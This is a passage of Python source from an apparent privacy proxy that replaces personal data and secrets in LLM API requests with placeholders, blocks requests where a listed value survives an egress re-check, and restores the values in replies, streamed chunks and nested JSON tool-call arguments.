                last = int(json.load(open(cp, encoding="utf-8")).get("n", 0))
            except (OSError, ValueError, AttributeError):
                last = 0
            if last >= 4 and n_new < last / 2.0:
                self.known_warning = ("known_file has %d values, down from %d when the proxy last ran (%s); check "
                                      "that the file is complete." % (n_new, last, os.path.basename(self.known_path)))
                self._alert(self.known_warning)
            if n_new != last:
                try:
                    _write_private(cp, {"n": n_new})
                except OSError:
                    pass
            self.known_user = list(new)
            self._set_known(list(new) + CANARY)
            return
        if prev and self.known_path and (n_new == 0 or (n_old >= 4 and n_new < n_old / 2.0)):
            self.known_warning = ("known_file went from %d to %d values (%s); still protecting the previous values "
                                  "too. Restart the proxy to accept the smaller list." %
                                  (n_old, n_new, os.path.basename(self.known_path)))
            keep = {_norm_key(v) for v, _t in new}
            new = list(new) + [x for x in prev if _norm_key(x[0]) not in keep]
            self.known_held = True
            print("swapback: warning: " + self.known_warning, file=sys.stderr, flush=True)
            self._alert(self.known_warning)
        elif n_new >= n_old / 2.0:
            self.known_warning, self.known_held = "", False
        self.known_user = list(new)
        self._set_known(list(new) + CANARY)

    def warnings(self):
        """plain-language warnings about the known file (blocked, shrunk, example values left, common-phrase names)."""
        w = [x for x in (self.known_block, self.known_warning) if x]
        if self.known_path and not self._known_fixed:
            dg = getattr(self, "known_digest", None)
            if getattr(self, "_warn_dg", 0) != dg:
                self._warn_cache, self._warn_dg = known_warnings(
                    self.known_path, title_case=self.cfg.get("common_names_title_case", True)), dg
            w += self._warn_cache
        return w

    # spans ---------------------------------------------------------
    def spans(self, text):
        """[(start, end, TYPE, value)] for everything that would be swapped (public, unchanged shape)."""
        return [x[:4] for x in self.spans_keyed(text)]

    def spans_keyed(self, text):
        """spans() plus each hit's placeholder key: (known/private-term key, canonical spelling), or None."""
        sp = []
        low = self.det.lower_same_len(text)
        for s, e, k, surf in self._known_hits_full(text, low):
            k = self.alias.get(k, k)
            v, t = self.known.get(k, (text[s:e], "PERSON"))
            # one placeholder per known value; the surface form rides Forms (decoded when the text was escaped)
            sp.append((s, e, t, 0, text[s:e] if surf is None else surf, (k, v)))
        for s, e, t, v in self._private_hits_full(text, low):
            sp.append((s, e, t, 0, v, (_canon(v), None)))
        found = self.presidio.find(text, low) + self.gitleaks.find(text, low)
        if any(c.isdigit() for c in text):
            found += self.det.find_phones(text, self.regions)
        for s, e, t, v in found:
            if self.on.get(t, True) and e > s and _valid(t, v):
                sp.append((s, e, t, 1, v, None))
        for t, p, g, gate in self.patterns:
            if gate and not any(x in low for x in gate):
                continue
            for m in p.finditer(text):
                s, e = m.span(g)
                v = text[s:e]
                if e <= s or not _valid(t, v):
                    continue
                sp.append((s, e, t, 1, v, None))
        sp = _listed_first(sp)
        sp.sort(key=lambda x: (x[0], x[3], -(x[1] - x[0])))
        res, last = [], -1
        for s, e, t, pr, v, key in sp:
            if s >= last:
                res.append((s, e, t, v, key))
                last = e
            elif res and e > res[-1][1] and s == res[-1][0]:
                res[-1] = (s, e, t, v, key)
                last = e
        return res

    def scrub_text(self, text, counts=None, forms=None):
        """forms: a Forms object that records the surface form behind each placeholder (for exact restore)."""
        return self._scrub(text, counts, forms)[0]

    def _scrub(self, text, counts=None, forms=None):
        """(scrubbed text, the same text with only listed values and private terms swapped, or None when no pattern
        detector swapped anything). The second feeds the egress re-check: a listed value that a pattern swap cut into
        (so the scrubbed text no longer shows it whole) is still seen there, and the request is blocked, not sent."""
        if not text or len(text) < 3:
            return text, None
        h = hashlib.blake2b(text.encode("utf-8", "surrogatepass"), digest_size=16).digest()
        c = self.cache.get(h)
        if c is not None:
            if counts is not None:
                for t, n in c[1].items():
                    counts[t] = counts.get(t, 0) + n
            if forms is not None:
                for ph, v in c[2]:
                    forms.add(ph, v)
            return c[0], c[3]
        out, pos, local, phs, und, pat = [], 0, {}, [], [], False
        for s, e, t, v, key in self.spans_keyed(text):
            out.append(text[pos:s])
            sv = text[s:e] if key is None else v          # a listed value found in escaped text keeps its decoded form
            ph = self.placeholder(sv, t, *(key or ()))   # pattern hits: the vault keeps the surface form (fix2)
            out.append(ph)
            # a pattern hit that holds a whole listed value ("jane [at] example [dot] com") stays swapped here; one
            # that holds only part of one (the street line of a listed address) is put back for the re-check
            back = key is None and not self.skeleton_hits(text[s:e])
            und += [text[pos:s], text[s:e] if back else ph]
            pat = pat or back
            phs.append((ph, sv))
            if forms is not None:
                forms.add(ph, sv)
            local[t] = local.get(t, 0) + 1
            pos = e
        out.append(text[pos:])
        r = "".join(out)
        u = "".join(und) + text[pos:] if pat else None
        if len(self.cache) > int(self.cfg.get("cache_items", 4000)):
            self.cache.clear()
            self.verified.clear()
        self.cache[h] = (r, local, tuple(phs), u)
        if counts is not None:
            for t, n in local.items():
                counts[t] = counts.get(t, 0) + n
        return r, u

    def leftover_known(self, text):
        """egress check: known values still present (count only), also in the decoded form of escaped text, so a
        value the swap missed in any spelling the model can read blocks the request instead of leaving."""
        if not text:
            return 0
        n = len(self._known_hits(text)) + len(self._private_hits_full(text))
        return n or len(self.skeleton_hits(text))

    def _private_hits_full(self, text, low=None):
        """[(start, end, TYPE, surface)] private-term hits in text and in its decoded views, mapped back to text."""
        hits = [(s, e, t, None) for s, e, t, v in self._private_hits(text, low)]
        for d, m, surf, _around_ in match_views(text):
            hits += [(m[s], m[e], t, surf(s, e)) for s, e, t, v in self._private_hits(d)]
        return [(s, e, t, text[s:e] if v is None else v) for s, e, t, v in _unescaped_surfaces(text, _dedupe(hits))]

    def _known_hits(self, text, low=None):
        """[(start, end, key)] known-value hits in text or in its decoded views (see decoded_views)."""
        return [h[:3] for h in self._known_hits_full(text, low)]

    def _known_hits_full(self, text, low=None):
        """[(start, end, key, decoded surface or None)]: hits in text as written, then hits in each decoded view
        mapped back to the escaped span they came from (surface: the decoded spelling, kept for the restore)."""
        hits = [(s, e, k, None) for s, e, k in self._known_hits_raw(text, low)]
        ctx = {}                                    # (start, end) -> the context of a hit found in a decoded view
        for d, m, surf, around in match_views(text):  # plain normalization: the written span itself is restored (exact)
            _tick()
            for s, e, k in self._known_hits_raw(d):
                hits.append((m[s], m[e], k, surf(s, e)))
                if around is not None:
                    ctx.setdefault((m[s], m[e]), (around, s, e))
        if hits and self.strict:                    # dictionary-word names: not across a sentence end or HTML blocks
            hits = [h for h in hits if self.alias.get(h[2], h[2]) not in self.strict or not _name_break(
                text[h[0]:h[1]] if h[3] is None else h[3], self.known.get(self.alias.get(h[2], h[2]), (h[2],))[0],
                *_ctx_of(text, h, ctx))]
        return _unescaped_surfaces(text, _dedupe(hits), ctx)

    def _known_hits_raw(self, text, low=None):
        """known-value hits, minus those that are a segment of a filesystem path (/home/<user>/..., ~/...), and minus
        lower-case hits of names that are also ordinary phrases (see _set_known)."""
        hits = self.known_m.find(text, low)
        more = []
        if self.known_var:
            low = low if low is not None else self.det.lower_same_len(text)
            more = [(m.start(), m.end(), k) for k, rx, w0, w1 in self.known_var if w0 in low and w1 in low
                    for m in rx.finditer(text)]
        if self.phone_core:
            more += self._phone_hits(text)
        if more:
            hits = sorted(list(hits) + more, key=lambda h: (h[0], h[0] - h[1]))
            out, last = [], -1
            for h in hits:
                if h[0] >= last:
                    out.append(h)
                    last = h[1]
            hits = out
        if hits and "/" in text:            # a name that is a path segment (/home/jane/) is kept; a phone, email or
            hits = [h for h in hits if not (self._is_name(h[2]) and in_fs_path(text, h[0], h[1]))]   # ID never is
        if hits and self.strict:
            caps = bool(self.cfg.get("common_names_all_caps", False))
            hits = [h for h in hits if self.alias.get(h[2], h[2]) not in self.strict or
                    _name_case(text[h[0]:h[1]], caps)]
        if hits and "," in text and self.cfg.get("common_names_title_case", True):
            hits = [h for h in hits if not self._comma_words(text[h[0]:h[1]], h[2])]
        return hits

    # skeleton re-check --------------------------------------------
    # The egress re-check does not rely on the matcher's rules. For every listed value it keeps a skeleton: letters and
    # digits only, accents stripped, compatibility forms folded (NFKD: fullwidth, ligatures), case folded. Each
    # outgoing string (and each decoded view of it) is reduced the same way and searched for those skeletons, with
    # loose edges: any punctuation, symbol, escape residue or nothing between the parts, and letters or digits glued
    # on at either end only where the letter/digit class or the case changes (Mob5035550147, x22). Listed phones are
    # found as their national digits inside any run of digits joined by up to 3 non-letters, whatever letters sit
    # around it. Whitespace inside a listed word does not join ("Ellis on" is not "Ellison"). Names that match only
    # when written as names (dictionary-word names: Title Case) keep that rule here too, and a name that is a
    # filesystem path segment is left, as in matching. Anything the matcher left that this finds blocks the request.
    SK_MIN = {"PHONE": 7, "EMAIL": 6, "ADDRESS": 10}

    def _sk_build(self):
        ents, seen, cores = [], set(), set()
        for k in list(self.known) + list(self.alias):
            v, t = self.known[self.alias.get(k, k)]
            src = k if k in self.alias else v
            if t == "PHONE":
                c = _phone_core(v)
                if c:
                    cores.add(c)
                continue
            words = [w.lower() for w in _SK_NONAN.split(skeleton_text(src)) if w]
            sk = "".join(words)
            if len(sk) < self.SK_MIN.get(t, 6) or (sk, t) in seen:
                continue
            seen.add((sk, t))
            starts, n = set(), 0
            for w in words:
                starts.add(n)
                n += len(w)
            ents.append((sk, frozenset(starts), t, self.alias.get(k, k) in self.strict, k))
        self.sk_ents, self.sk_cores = ents, cores
        self.sk_core_lens = sorted({len(c) for c in cores})

    def skeleton_hits(self, text):
        """[(TYPE, key)] listed values the skeleton re-check finds in text or in any decoded view of it."""
        if not text or len(text) < 6 or not (getattr(self, "sk_ents", None) or getattr(self, "sk_cores", None)):
            return []
        out, views = [], [text] + [d for d, _m in decoded_views(text, depth=MATCH_DEPTH)]
        views += [_HTML_TAG.sub(_sk_tag, v) for v in views if "<" in v and ">" in v]    # <br>-joined lines, tagged parts
        for view in views:
            _tick()
            out += self._sk_scan(skeleton_text(view))
            if out:
                break
        return out

    def _sk_scan(self, t):
        out = []
        if self.sk_cores and sum(c.isdigit() for c in t[:200000]) >= 7:
            for m in _SK_DIGITRUN.finditer(t):
                groups = _DIGITS.findall(m.group(0))
                run = "".join(groups)
                if len(run) < 7:
                    continue
                # a listed phone's national digits must start where a digit group starts (or after a country code /
                # trunk prefix of up to 3 digits glued on) and end where a group ends: "0123456789" does not hold
                # "9012345678", whatever letters or punctuation sit around the number
                gs, ge, n0 = set(), set(), 0
                for g in groups:
                    gs.add(n0)
                    n0 += len(g)
                    ge.add(n0)
                starts = gs | {1, 2, 3}
                for n in self.sk_core_lens:
                    if any(run[i:i + n] in self.sk_cores for i in starts if i + n in ge):
                        out.append(("PHONE", None))
                        return out
        if not self.sk_ents:
            return out
        sk = _SK_NONAN.sub("", t)
        low = sk.lower()
        if len(low) != len(sk):
            low = "".join((c.lower() or c)[:1] for c in sk)
        pos = None
        caps = bool(self.cfg.get("common_names_all_caps", False))
        for s, starts, typ, strict, key in self.sk_ents:
            i = low.find(s)
            while i != -1:
                if pos is None:
                    pos = [m.start() for m in _SK_ALNUM.finditer(t)]
                if self._sk_ok(t, sk, pos, i, i + len(s), starts, typ, strict, key, caps):
                    out.append((typ, key))
                    break
                i = low.find(s, i + 1)
        return out

    def _sk_ok(self, t, sk, pos, i, j, starts, typ, strict, key, caps):
        def edge(a, b):                     # sk[a], sk[b] side by side in t: a real boundary between them?
            if pos[b] != pos[a] + 1:
                return True
            x, y = sk[a], sk[b]
            return x.isdigit() != y.isdigit() or (x.islower() and y.isupper())
        if i > 0 and not edge(i - 1, i):
            return False
        if j < len(sk) and not edge(j - 1, j):
            return False
        for q in range(i, j - 1):
            g = pos[q + 1] - pos[q] - 1
            if not g:
                continue
            gap = t[pos[q] + 1:pos[q + 1]]
            if (q + 1 - i) in starts:
                if g > 12:
                    return False
            elif g > 3 or any(c.isspace() for c in gap):
                return False
        name = typ in ("PERSON", "FAMILY", "ORG")
        if strict:
            if _name_break(t[pos[i]:pos[j - 1] + 1], self.known.get(key, (" ",))[0] if key else " ",
                           t[max(0, pos[i] - 300):pos[i]], t[pos[j - 1] + 1:pos[j - 1] + 301]):
                return False
            word_first = [sk[i + n] for n in starts]
            letters = sk[i:j]
            if not all(c.isupper() for c in word_first if c.isalpha()):
                return False
            if not caps and any(c.isalpha() for c in letters) and letters.upper() == letters:
                return False
        if name:
            a, b = pos[i], pos[j - 1] + 1
            if "/" in t[max(0, a - 1):b + 1] and in_fs_path(t, a, b):
                return False
            surf = t[a:b]
            if "," in surf and self._comma_words(surf, key):
                return False
        return True

    def _is_name(self, k):
        return self.known.get(self.alias.get(k, k), ("", "PERSON"))[1] in ("PERSON", "FAMILY", "ORG")

    def _comma_words(self, surface, k):
        """True for a lower-case name hit whose comma sits between ordinary words ("say grace, lee side"): a comma
        separates "Lee, Grace" only when the words are written as a name."""
        if "," not in surface or _title_case(surface):
            return False
        if self.known.get(self.alias.get(k, k), ("", "PERSON"))[1] not in ("PERSON", "FAMILY", "ORG"):
            return False
        a, _, b = surface.partition(",")
        wa, wb = re.findall(r"[^\W\d_]+", a.lower())[-1:], re.findall(r"[^\W\d_]+", b.lower())[:1]
        words = dictionary_words()
        return bool(wa and wb) and all(x in words or x in _COMMON for x in wa + wb)

    def path_kept(self, text):
        """how many known-value hits in text were left alone because they sit inside a filesystem path."""
        if not text or "/" not in text:
            return 0
        return sum(1 for s, e, k in self.known_m.find(text) if self._is_name(k) and in_fs_path(text, s, e))

    # request -------------------------------------------------------
    SKIP_KEYS = {"model", "role", "type", "tool_call_id", "id", "tool_choice", "response_format", "stop", "format",
                 "reasoning_effort", "service_tier"}

    def scrub_request(self, body, counts=None, forms=None, api=None):
        """mutates and returns body; raises ScrubError on anything unexpected (fail closed). forms: see Forms.
        api: "chat" (default), "anthropic" (/v1/messages) or "responses" (/v1/responses); says where the
        system note goes."""
        counts = {} if counts is None else counts
        left = [0]

        def walk(o, key=None, parent=None):
            if isinstance(o, dict):
                is_fn = "parameters" in o or "arguments" in o
                for k in list(o):
                    v = o[k]
                    if k in self.SKIP_KEYS or (k == "name" and is_fn):
                        if isinstance(v, str):
                            left[0] += self.leftover_known(v)
                        continue
                    if k == "url" and isinstance(v, str) and v.startswith("data:"):
                        continue
                    o[k] = walk(v, k, o)
                return o
            if isinstance(o, list):
                return [walk(x, key, parent) for x in o]
            if isinstance(o, str):
                if "\\" in o and _PAST_CAP.search(o):
                    raise ScrubError("a run of %d or more backslashes cannot be checked (JSON nested more than %d levels "
                                     "deep, or a backslash nested %d deep)" % (2 ** MATCH_DEPTH, MATCH_DEPTH, MATCH_DEPTH))
                _tick()
                s, u = self._scrub(o, counts, forms)
                h = hashlib.blake2b((s if u is None else s + "\x00" + u).encode("utf-8", "surrogatepass"),
                                    digest_size=16).digest()
                if h not in self.verified:
                    n = self.leftover_known(s)
                    if not n and u is not None:             # a listed value a pattern swap cut into: still blocked
                        n = len(self.skeleton_hits(u))
                    left[0] += n
                    if not n:
                        self.verified.add(h)
                return s
            return o
        try:
            lim = float(self.cfg.get("scrub_timeout_s", 10) or 0)
        except (TypeError, ValueError):
            lim = 10.0
        prev_dl = getattr(_TL, "deadline", None)
        _TL.deadline = (time.monotonic() + lim, lim) if lim > 0 else None
        try:
            self.reload_known()
            if self.known_block:
                raise ScrubError(self.known_block)
            if isinstance(body, dict):                # /v1/embeddings input, /v1/completions prompt as token ids: unreadable
                for k in ("input", "prompt"):
                    v = body.get(k)
                    if isinstance(v, int) or (isinstance(v, list) and any(
                            isinstance(x, int) or (isinstance(x, list) and any(isinstance(y, int) for y in x)) for x in v)):
                        raise ScrubError("token-id %s cannot be checked" % k)
            walk(body)
            note = self.cfg.get("system_note")
            if note and isinstance(body, dict):
                add_system_note(body, note, api, swapped=any(v for v in counts.values() if isinstance(v, int)))
        except ScrubError:
            raise
        except Exception as e:
            raise ScrubError("scrub failed: %s" % type(e).__name__) from None
        finally:
            _TL.deadline = prev_dl
        if left[0]:
            raise ScrubError("egress check: %d known value(s) left after the swap" % left[0])
        self.save_vault()
        return body

    # restore -------------------------------------------------------
    def _val(self, ph, js, forms=None, before=None):
        v = forms.take(ph) if forms is not None else None
        if v is not None and before is not None and not _fits_here(v, before):
            v = None                                 # a span that crossed HTML blocks, reused elsewhere: the listed value
        if v is None:
            v = self.rev.get(ph)
        if v is None:
            return None
        js = int(js)
        if isinstance(v, _Esc):
            if v.raw is not None and js == v.depth:  # where it was: the span exactly as it was written
                return v.raw
            v = str(v)
        for _ in range(js):                          # js: JSON string levels to escape for (True = 1)
            v = json.dumps(v, ensure_ascii=False)[1:-1]
        return v

    def restore_text(self, text, js=False, stats=None, forms=None, jstate=None, prev=""):
        """placeholders -> values. With the request's Forms, each variant comes back exactly as it was written;
        without, the vault's spelling (for a known value, as written in the known file).
        A reply that is a JSON document (JSON mode, structured output): a value restored inside one of its strings is
        JSON-escaped (quotes, backslashes, newlines and other control characters; "é" stays as it is), so a multi-line
        address keeps the JSON valid. jstate: a JsonStrState carried across stream chunks (StreamRestorer)."""
        if not text or ("_" not in text):
            return text

        def mk():                                   # where each placeholder sits: JSON string levels, read from the text
            return jstate.copy() if jstate is not None else JsonStrState()
        jst = mk()

        def bef(pos, cur):                          # what the reply holds right before a placeholder (see _fits_here):
            return cur, pos, prev                   # read there only for a span that crossed HTML blocks
        if not js:
            def val(ph, pos, cur):
                return self._val(ph, jst.depth_at(cur, pos), forms, bef(pos, cur))
        else:
            def val(ph, pos, cur):                  # tool-call arguments: one level, more inside nested JSON strings
                if jstate is None and "\\" not in cur:
                    return self._val(ph, 1, forms, bef(pos, cur))
                return self._val(ph, max(1, jst.depth_at(cur, pos)), forms, bef(pos, cur))

        def rep(m):
            v = val(m.group(0), m.start(), text)
            if v is None:
                if stats is not None:
                    stats["unknown"] = stats.get("unknown", 0) + 1
                return m.group(0)
            if stats is not None:
                stats["restored"] = stats.get("restored", 0) + 1
            return v
        text = PH_RE.sub(rep, text)
        if "\\u00" in text:
            jst2, cur1 = mk(), text

            def rep_js(m):
                n = len(m.group(1))                 # \u00ab..: JSON inside JSON, escaped once more per level
                one = n & (n - 1) == 0
                d = jst2.depth_at(cur1, m.start())  # the JSON string levels it really sits in (mixed escaping: an
                if not js and not d:                # ASCII-escaped outer level around a raw inner one writes \u00ab
                    return m.group(0)               # once at any depth); in a text reply only inside a JSON string
                lv = max(n.bit_length(), d) if one else 1
                v = self._val(f"{L}{m.group(2)}_{m.group(3)}{R}", lv, forms, bef(m.start(), cur1))
                if v is None:
                    return m.group(0)
                if stats is not None:
                    stats["restored"] = stats.get("restored", 0) + 1
                return v if one else m.group(1)[:-1] + v
            text = JS_PH_RE.sub(rep_js, text)
        if self.cfg.get("restore_bare", True):
            cur2 = text
            jst = mk()

            def rep2(m):
                ph = f"{L}{m.group(1)}_{m.group(2)}{R}"
                v = val(ph, m.start(), cur2)
                if v is None:
                    return m.group(0)
                if stats is not None:
                    stats["restored"] = stats.get("restored", 0) + 1
                return v
            text = BARE_RE.sub(rep2, text)
        return text

    def tool_policy(self):
        tr = self.cfg.get("tool_restore", True)
        k = json.dumps(tr, sort_keys=True, default=str)
        if getattr(self, "_tp_key", None) != k:
            self._tp, self._tp_key = ToolPolicy(tr), k
        return self._tp

    def tool_keep(self, name, args, stats=None):
        """True when this tool call keeps its placeholders (the restore policy, see ToolPolicy). Counts a kept call
        that carries a placeholder as stats["tool_kept"]."""
        raw = args if isinstance(args, str) else json.dumps(args, ensure_ascii=False)
        pol = self.tool_policy()
        keep = pol.decide(name, raw, self.restore_text(raw, js=True) if pol.keep_if_url else None)
        if keep and stats is not None and self.has_placeholder(raw):
            stats["tool_kept"] = stats.get("tool_kept", 0) + 1
        return keep

    def has_placeholder(self, text):
        return bool(text) and bool(PH_RE.search(text) or JS_PH_RE.search(text) or
                                   (self.cfg.get("restore_bare", True) and BARE_RE.search(text)))

    def restore_obj(self, o, stats=None, key=None, forms=None):
        if isinstance(o, dict):
            tc = tool_call_args(o)
            if tc is not None and self.tool_keep(tc[0], o[tc[1]], stats):
                return {k: (v if k == tc[1] else self.restore_obj(v, stats, k, forms)) for k, v in o.items()}
            return {k: self.restore_obj(v, stats, k, forms) for k, v in o.items()}
        if isinstance(o, list):
            return [self.restore_obj(x, stats, key, forms) for x in o]
        if isinstance(o, str):
            return self.restore_text(o, js=(key == "arguments" or _escaped_json_doc(o)), stats=stats, forms=forms)
        return o

    def stream_restorer(self, js=False, stats=None, forms=None):
        return StreamRestorer(self, js, stats, forms)


_BARE_TAIL = re.compile(r"(?<![A-Za-z0-9_])([A-Z][A-Z_]*\d*)$")
_TYPE_PREFIXES = {(t + "_")[:i] for t in TYPES for i in range(1, len(t) + 2)}
_BARE_FULL = re.compile(r"(?:" + "|".join(TYPES) + r")_\d+")


class JsonStrState:
    """whether a position in a reply sits inside a string of a JSON document. A reply is a JSON document when its first
    non-blank character is { or [. In any other reply (prose, markdown), each { or [ opens a JSON region that lasts
    until its brackets close: a ```json fence, or an object written inline in a sentence. A region ends early at the
    first character JSON does not allow (a letter outside a string other than true/false/null, a raw newline inside a
    string), so ordinary prose with a brace in it is left as prose. Scans forward only."""
    __slots__ = ("doc", "ins", "esc", "src", "pos", "sbuf", "emb", "kid", "kbuf")
    _OK = frozenset(" \t\r\n,:0123456789-+.eEtruefalsn")

    def __init__(self):
        self.doc, self.ins, self.esc, self.src, self.pos, self.sbuf, self.emb = None, False, False, None, 0, [], 0
        self.kid, self.kbuf = None, None

    def copy(self):
        o = JsonStrState()
        o.doc, o.ins, o.esc, o.sbuf, o.emb = self.doc, self.ins, self.esc, list(self.sbuf), self.emb
        if self.kid is not None and self.kbuf is self.sbuf:
            o.kid, o.kbuf = self.kid.copy(), o.sbuf
        return o

    def feed(self, s, a=0, b=None):
        b = len(s) if b is None else b
        i = a
        while i < b:
            c = s[i]
            i += 1
            if self.doc is None:
                if c.isspace():
                    continue
                self.doc = c in "{["
                if self.doc:
                    continue
            if self.doc:                             # the whole reply is a JSON document
                if self.esc:
                    self.esc = False
                    self.sbuf.append(c)
                elif self.ins:
                    if c == "\\":
                        self.esc = True
                        self.sbuf.append(c)
                    elif c == '"':
                        self.ins = False
                        self.sbuf = []
                    else:
                        self.sbuf.append(c)
                elif c == '"':
                    self.ins, self.sbuf = True, []
                continue
            if not self.emb:                         # prose: a JSON region opens at { or [
                if c == "{" or c == "[":
                    self.emb = 1
                continue
            if self.esc:
                self.esc = False
                self.sbuf.append(c)
            elif self.ins:
                if c == "\\":
                    self.esc = True
                    self.sbuf.append(c)
                elif c == '"':
                    self.ins = False
                    self.sbuf = []
                elif c == "\n":                      # a raw newline: this was not a JSON string
                    self.ins, self.sbuf, self.emb = False, [], 0
                else:
                    self.sbuf.append(c)
            elif c == '"':
                self.ins, self.sbuf = True, []
            elif c == "{" or c == "[":
                self.emb += 1
            elif c == "}" or c == "]":
                self.emb -= 1
            elif c not in self._OK:
                self.emb = 0                         # not JSON after all

    def inside_at(self, s, pos):
        """inside a JSON string at s[pos] (positions asked in increasing order on the same s)."""
        if self.src is not s:
            self.src, self.pos = s, 0
        self.feed(s, self.pos, pos)
        self.pos = max(self.pos, pos)
        return self.ins and bool(self.doc or self.emb)

    def depth_at(self, s, pos):
        """how many JSON string levels a value written at s[pos] sits in: 0 outside any string, 1 inside a string of
        this document, 2 when that string's content is itself a JSON document and the position is inside one of its
        strings (json.dumps of json.dumps), and so on (up to _RESTORE_DEPTH: a placeholder the model wrote deeper than
        the 8 levels the matcher reads is still escaped once per level)."""
        if not self.inside_at(s, pos):
            return 0
        if not _may_be_json(self.sbuf):             # a string that does not start like JSON: one level, read in O(1)
            return 1                                # (not the whole string again per placeholder: many copies in one
        if self.kbuf is not self.sbuf:              # long string stay linear)
            self.kid, self.kbuf = _InnerJson(_RESTORE_DEPTH - 1), self.sbuf
        return 1 + self.kid.depth(self.sbuf)


class _InnerJson:
    """_inner_depth read incrementally: the escaped content of a JSON string is fed as it grows (only the part not
    read yet), decoded, and followed as a JSON document; inside one of its strings a child does the same one level
    down. Asking for the depth after each of many copies of a value in one long, deeply nested string is then linear
    in the string, where reading the whole string again per copy was quadratic (8 levels deep, 100 KB took 45 s)."""
    __slots__ = ("left", "fed", "pend", "broken", "doc", "ins", "esc", "bad", "word", "buf", "kid")
    _ESC1 = {'"': '"', "\\": "\\", "/": "/", "b": "\b", "f": "\f", "n": "\n", "r": "\r", "t": "\t"}
    _HEX = frozenset("0123456789abcdefABCDEF")
    _HEAD_OK = frozenset("{}[],:+-.")

    def __init__(self, left):
        self.left, self.fed, self.pend, self.broken = left, 0, "", False
        self.doc, self.ins, self.esc, self.bad, self.word, self.buf, self.kid = None, False, False, False, "", [], None

    def copy(self):
        o = _InnerJson(self.left)
        o.fed, o.pend, o.broken, o.doc, o.ins, o.esc, o.bad, o.word = (
            self.fed, self.pend, self.broken, self.doc, self.ins, self.esc, self.bad, self.word)
        o.buf = list(self.buf)
        o.kid = self.kid.copy() if self.kid is not None else None
        return o

    def depth(self, raw):
        """_inner_depth("".join(raw), left): raw is the content read so far, the part already read unchanged."""
        if self.left <= 0:
            return 0
        if self.fed < len(raw):
            self._feed(raw, self.fed)
            self.fed = len(raw)
        if self.broken or self.pend or not (self.doc and self.ins) or self.bad:
            return 0                                 # not valid JSON text so far, not inside a string, or prose
        if self.kid is None:
            self.kid = _InnerJson(self.left - 1)
        return 1 + self.kid.depth(self.buf)

    def _feed(self, raw, a):
        for i in range(a, len(raw)):
            if self.broken:
                return
            ch = raw[i]
            p = self.pend
            if p:
                if len(p) == 1:
                    if ch == "u":
                        self.pend = "\\u"
                        continue
                    d = self._ESC1.get(ch)
                    if d is None:
                        self.broken = True
                        return
                    self.pend = ""
                    self._dec(d)
                else:
                    if ch not in self._HEX:
                        self.broken = True
                        return
                    p += ch
                    self.pend = p
                    if len(p) == 6:
                        self.pend = ""
                        self._dec(chr(int(p[2:], 16)))
                continue
            if ch == "\\":
                self.pend = ch
            elif ch < " ":
                self.broken = True                   # a raw control character: json.loads refuses the string
            else:
                self._dec(ch)

    def _dec(self, c):
        if self.doc is None:
            if c.isspace():
                return
            self.doc = c in "{["
            return
        if not self.doc:
            return
        if self.ins:
            if self.esc:
                self.esc = False
                self.buf.append(c)
            elif c == "\\":
                self.esc = True
                self.buf.append(c)
            elif c == '"':
                self.ins, self.buf, self.kid = False, [], None
            else:
                self.buf.append(c)
            return
        if c == '"':
            self._word_end()
            self.ins, self.buf, self.kid = True, [], None
        elif c.isascii() and c.isalnum():
            self.word += c
        else:
            self._word_end()
            if not (c.isspace() or c in self._HEAD_OK):
                self.bad = True                      # _NOT_JSON: a character JSON structure does not use

    def _word_end(self):
        w = self.word
        if w:
            if w[0].isalpha() and w not in ("true", "false", "null"):
                self.bad = True                      # _NOT_JSON: a bare word other than true, false or null
            self.word = ""



def _may_be_json(buf):
    """the escaped content of a JSON string read so far (a list of characters) could be a JSON document: its first
    character past blanks and escaped blanks (\\n, \\t, \\r) is {, [ or another escape (\\u007b ...)."""
    i, n = 0, len(buf)
    while i < n:
        c = buf[i]
        if c in " \t\r\n":
            i += 1
        elif c == "\\" and i + 1 < n and buf[i + 1] in "nrt":
            i += 2
        else:
            return c in "{[\\"
    return False


_RESTORE_DEPTH = 2 * MATCH_DEPTH


def _inner_depth(raw, left):
    """JSON string levels at the end of raw, the escaped content of a JSON string read so far."""
    if left <= 0 or not raw:
        return 0
    try:
        txt = json.loads('"' + raw + '"')
    except ValueError:
        return 0
    st = JsonStrState()
    st.feed(txt)
    if not (st.doc and st.ins):
        return 0
    head = _JSON_STR.sub("", txt[:len(txt) - len(st.sbuf) - 1])
    if _NOT_JSON.search(head):                      # "[1] Contact: \"..." starts with [ but is prose, not JSON
        return 0
    return 1 + _inner_depth("".join(st.sbuf), left - 1)


_JSON_STR = re.compile(r'"(?:[^"\\]|\\.)*"')
_NOT_JSON = re.compile(r"[^\s{}\[\],:0-9A-Za-z+\-.]|\b(?!(?:true|false|null)\b)[A-Za-z]\w*")


def _escaped_json_doc(s):
    """a string value that is itself a JSON document carrying an ASCII-escaped placeholder (Anthropic tool_use input:
    {"nested": "{\\"a\\": \\"\\u00abPERSON_1\\u00bb\\"}"}): restored as tool-call arguments are, escaped for JSON."""
    if "\\u00" not in s or not JS_PH_RE.search(s) or s.lstrip()[:1] not in ("{", "["):
        return False
    try:
        return isinstance(json.loads(s), (dict, list))
    except ValueError:
        return False


def _back_bs(b, i):
    """i moved back over the backslashes before it (at most 2**MATCH_DEPTH): \\\\u00ab (a placeholder escaped for JSON inside JSON)
    is cut whole, not between its backslashes."""
    j = i
    while j > 0 and i - j < 2 ** MATCH_DEPTH and b[j - 1] == "\\":
        j -= 1
    return j


class StreamRestorer:
    """feed(chunk) -> text safe to emit now; a tail that may be a split placeholder waits for the next chunk."""

    def __init__(self, scr, js=False, stats=None, forms=None):
        self.s, self.js, self.stats, self.buf, self.forms = scr, js, stats, "", forms
        self.jstate = JsonStrState()
        self.tail = ""

    def _cut(self, b):
        if "\\" in b[-(2 ** (MATCH_DEPTH + 1) + 48):]:   # JSON text may carry the placeholder escaped: \u00abPERSON_1\u00bb
            low = b[-(2 ** (MATCH_DEPTH + 1) + 48):].lower()      # a placeholder escaped 8 levels deep: ~300 chars
            off = len(b) - len(low)
            i = low.rfind("\\u00ab")
            if i != -1 and "\\u00bb" not in low[i:]:
                return min(_back_bs(b, off + i), self._cut_plain(b))
            for k in range(5, 0, -1):               # a tail that may be the start of an escape: \ \u \u0 \u00 \u00a
                if low.endswith("\\u00ab"[:k]):
                    return min(_back_bs(b, len(b) - k), self._cut_plain(b))
        return self._cut_plain(b)

    def _cut_plain(self, b):
        i = b.rfind(L)
        if i != -1 and R not in b[i:] and len(b) - i <= 24:
            return i
        if self.s.cfg.get("restore_bare", True):
            m = _BARE_TAIL.search(b[-24:])
            if m:
                w = m.group(1)
                if w in _TYPE_PREFIXES or _BARE_FULL.fullmatch(w):
